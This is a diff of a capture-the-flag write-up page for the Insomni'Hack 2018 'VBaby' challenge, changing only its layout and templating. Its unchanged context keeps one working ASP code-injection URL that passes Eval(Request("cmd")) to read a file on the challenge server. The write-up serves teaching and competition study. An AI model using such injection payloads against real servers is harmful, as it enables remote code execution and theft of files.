@@ -1,10 +1,9 @@
 ---
 title: Insomni'Hack 2018 - VBaby
+layout: writeup
 date: 2018-03-25 21:00:00 +0100
 authors: qlemaire
 ---
-
-# {{page.title}}
 Solves: 22 / Points: 137
 
 ## Challenge description
@@ -40,6 +39,3 @@ This final request allows us to grab the flag:
 http://vbaby.insomni.hack/Default.asp?page=%26Eval(Request("cmd"))&cmd=CreateObject("scripting.FileSystemObject").OpenTextFile("C:\this_file_contains_the_flag_guys.txt").ReadAll
 ```
 ![Reading flag]({{ site.url }}/assets/reading-flag.png)
-
-{% capture page_authors %}{{ page.authors }}{% endcapture %}
-{% include authors.html authors=page_authors %}
